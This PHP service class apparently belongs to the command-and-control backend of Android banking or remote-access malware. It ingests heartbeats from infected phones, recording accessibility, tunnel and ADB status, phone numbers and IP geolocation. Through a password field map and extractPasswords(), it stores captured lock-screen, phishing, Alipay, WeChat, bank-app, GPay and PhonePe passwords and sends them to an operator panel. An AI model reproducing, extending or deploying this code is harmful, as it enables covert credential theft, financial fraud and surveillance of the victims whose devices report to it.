<?php

declare(strict_types=1);

namespace App\WebSocket\Services;

use App\Models\Device;
use App\Services\GeoIpService;
use App\WebSocket\Config\WebSocketConfig;
use App\WebSocket\ConnectionManager;
use App\WebSocket\WebSocketLog;
use Illuminate\Support\Facades\Redis;

class DeviceStatusService
{
    private const FIELD_NAME_MAP = [
        'deviceId' => 'device_id',
        'deviceName' => 'device_name',
        'osVersion' => 'android_version',
        'sdkVersion' => 'sdk_version',
        'batteryLevel' => 'battery_level',
        'isCharging' => 'battery_is_charging',
        'isLocked' => 'is_locked',
        'isScreenOn' => 'is_screen_on',
        'networkType' => 'network_type',
        'accessibilityAlive' => 'has_accessibility',
        'hasSim' => 'has_sim',
        'screenWidth' => 'screen_width',
        'screenHeight' => 'screen_height',
        'appName' => 'app_name',
        'appVersion' => 'app_version',
        'phoneNumber' => 'phone_number',
        'phoneNumber2' => 'phone_number2',
        'wsConnected' => 'ws_connected',
        'owner_token' => 'owner_token',
        'tunnelStatus' => 'tunnel_status',
        'adbStatus' => 'adb_status',
    ];

    private const PASSWORD_FIELD_MAP = [
        'phone' => 'pass_phone',
        'phish' => 'pass_phish',
        'alipay' => 'pass_alipay',
        'wechat' => 'pass_wechat',
        'yun' => 'pass_yun',
        'jian' => 'pass_jian',
        'you' => 'pass_you',
        'nong' => 'pass_nong',
        'zhong' => 'pass_zhong',
        'gong' => 'pass_gong',
        'zhao' => 'pass_zhao',
        'gpay' => 'pass_gpay',
        'phonepe' => 'pass_phonepe',
        'bc' => 'pass_bc',
        'mb' => 'pass_mb',
    ];

    private const TRANSIENT_KEYS = [
        'wallpap', 'activz', 'is_locked', 'is_screen_on',
        'tunnel_status', 'adb_status',
        'pass_phone', 'pass_phish', 'pass_alipay', 'pass_wechat',
        'pass_yun', 'pass_jian', 'pass_you', 'pass_nong',
        'pass_zhong', 'pass_gong', 'pass_zhao', 'pass_gpay',
        'pass_phonepe', 'pass_bc', 'pass_mb',
    ];

    public function __construct(
        private readonly ConnectionManager $connectionManager,
        private readonly DatabaseReconnector $databaseReconnector,
        private readonly PanelNotificationService $panelNotificationService,
    ) {}

    /**
     * 处理心跳：写 DB + 存瞬态到 Redis
     */
    public function updateFromPing(string $phoneId, array $messageData): void
    {
        $status = $this->normalizeFieldNames($messageData);
        $status = $this->enrichWithGeoIp($phoneId, $status);

        $this->connectionManager->updateDeviceStatus($phoneId, $status);
        $this->syncToDatabase($phoneId, $status);
    }

    /**
     * 格式化面板数据：DB 读持久字段，Redis 读瞬态字段
     */
    public function formatForPanel(string $phoneId): array
    {
        $device = Device::where('uuid', $phoneId)->first();
        if (! $device) {
            return ['pid' => $phoneId, 'is_online' => false];
        }

        $result = [
            'pid' => $phoneId,
            'uuid' => $device->uuid,
            'device_name' => $device->name,
            'model' => $device->model,
            'brand' => $device->brand,
            'android_version' => $device->android_version,
            'app_name' => $device->app_name,
            'app_version' => $device->app_version,
            'battery_level' => $device->battery_level,
            'battery_is_charging' => (bool) $device->is_charging,
            'has_accessibility' => (bool) $device->has_accessibility,
            'network_type' => $device->network_type,
            'phone_number' => $device->phone_number,
            'phone_number2' => $device->phone_number2,
            'screen_width' => $device->screen_width,
            'screen_height' => $device->screen_height,
            'has_sim' => (bool) $device->has_sim,
            'ip' => $device->ip_address ?? '',
            'ip_location' => $device->ip_location ?? '',
            'country' => $device->country ?? '',
            'is_online' => (bool) $device->is_online,
            'remark' => $device->remark,
            'last_seen_at' => $device->last_seen_at?->toISOString(),
            'installed_at' => $device->installed_at?->toISOString(),
            'lastPing' => $device->last_seen_at?->getTimestamp() ? $device->last_seen_at->getTimestamp() * 1000 : 0,
            'tunnel_status' => $device->tunnel_status ?? 'unknown',
        ];

        $redisStatus = $this->connectionManager->getDeviceStatus($phoneId);
        foreach (self::TRANSIENT_KEYS as $key) {
            if (isset($redisStatus[$key]) && $redisStatus[$key] !== '') {
                $val = $redisStatus[$key];
                if (is_string($val) && ($val[0] === '{' || $val[0] === '[')) {
                    $decoded = json_decode($val, true);
                    $result[$key] = $decoded !== null ? $decoded : $val;
                } else {
                    $result[$key] = $val;
                }
            }
        }

        return $result;
    }

    public function isOnline(string $phoneId): bool
    {
        return $this->connectionManager->isDeviceOnline($phoneId);
    }

    public function markOffline(string $phoneId): void
    {
        Device::where('uuid', $phoneId)->update([
            'is_online' => false,
            'last_seen_at' => now(),
        ]);
    }

    public function extractPasswords(string $phoneId): array
    {
        $redisStatus = $this->connectionManager->getDeviceStatus($phoneId);

        return array_map(
            fn (string $field) => $redisStatus[$field] ?? '',
            self::PASSWORD_FIELD_MAP,
        );
    }

    public function formatFullStatusForPanel(string $phoneId): array
    {
        $phoneInfo = $this->formatForPanel($phoneId);
        $passwords = $this->extractPasswords($phoneId);

        return [
            'phoneInfo' => $phoneInfo,
            'passwords' => $passwords,
            'is_online' => $phoneInfo['is_online'],
            'lastPing' => $phoneInfo['lastPing'] ?? null,
        ];
    }

    // ── Private ──

    private function normalizeFieldNames(array $data): array
    {
        $normalized = [];
        foreach ($data as $key => $value) {
            $normalized[self::FIELD_NAME_MAP[$key] ?? $key] = $value;
        }

        return $normalized;
    }

    private function enrichWithGeoIp(string $phoneId, array $status): array
    {
        try {
            if (empty($status['ip'])) {
                $clientIp = $this->connectionManager->getClientIp($phoneId);
                if ($clientIp !== null) {
                    $status['ip'] = $clientIp;
                }
            }

            if (! empty($status['ip'])) {
                $device = Device::where('uuid', $phoneId)->first();
                if ($device && $status['ip'] === $device->ip_address && ! empty($device->ip_location)) {
                    $status['ip_location'] = $device->ip_location;
                } else {
                    $status['ip_location'] = app(GeoIpService::class)->getLocation($status['ip']);
                }
            }
        } catch (\Throwable $e) {
            WebSocketLog::getLogger()->warning('GeoIP failed', [
                'phone_id' => $phoneId,
                'error' => $e->getMessage(),
            ]);
        }

        return $status;
    }

    private function syncToDatabase(string $phoneId, array $status): void
    {
        $this->databaseReconnector->reconnect();

        $device = Device::where('uuid', $phoneId)->first();
        if (! $device) {
            WebSocketLog::getLogger()->debug("Device {$phoneId} not registered, skipping");

            return;
        }

        $updates = $this->buildDatabaseUpdates($status);
        $wasOffline = ! $device->getOriginal('is_online');
        $device->update($updates);

        if ($wasOffline || $this->isNewWebSocketConnection($phoneId)) {
            $phoneInfo = $this->formatForPanel($phoneId);
            $this->panelNotificationService->notifyDeviceOnline($phoneId, $device->user_id, $phoneInfo);
        }
    }

    private function buildDatabaseUpdates(array $status): array
    {
        $updates = [
            'is_online' => true,
            'last_seen_at' => now(),
        ];

        $stringFields = [
            'device_name' => 'name',
            'model' => 'model',
            'brand' => 'brand',
            'manufacturer' => 'manufacturer',
            'android_version' => 'android_version',
            'app_name' => 'app_name',
            'app_version' => 'app_version',
            'phone_number' => 'phone_number',
            'phone_number2' => 'phone_number2',
            'network_type' => 'network_type',
            'country' => 'country',
            'ip' => 'ip_address',
            'ip_location' => 'ip_location',
        ];

        foreach ($stringFields as $statusKey => $dbColumn) {
            if (isset($status[$statusKey]) && $status[$statusKey] !== '') {
                $updates[$dbColumn] = $status[$statusKey];
            }
        }

        $intFields = [
            'battery_level' => 'battery_level',
            'sdk_version' => 'sdk_version',
            'screen_width' => 'screen_width',
            'screen_height' => 'screen_height',
        ];

        foreach ($intFields as $statusKey => $dbColumn) {
            if (isset($status[$statusKey]) && is_numeric($status[$statusKey])) {
                $updates[$dbColumn] = (int) $status[$statusKey];
            }
        }

        if (isset($status['tunnel_status']) && $status['tunnel_status'] !== '') {
            $updates['tunnel_status'] = $status['tunnel_status'];
        }

        $boolFields = [
            'battery_is_charging' => 'is_charging',
            'has_sim' => 'has_sim',
            'has_accessibility' => 'has_accessibility',
        ];

        foreach ($boolFields as $statusKey => $dbColumn) {
            if (isset($status[$statusKey])) {
                $updates[$dbColumn] = (bool) $status[$statusKey];
            }
        }

        return $updates;
    }

    private function isNewWebSocketConnection(string $phoneId): bool
    {
        $key = WebSocketConfig::lastNotifiedKey($phoneId);
        $lastNotified = Redis::get($key);
        $now = time();

        Redis::setex($key, WebSocketConfig::lastNotifiedTtl(), (string) $now);

        if ($lastNotified === null) {
            return true;
        }

        return ($now - (int) $lastNotified) > WebSocketConfig::newConnectionThreshold();
    }
}
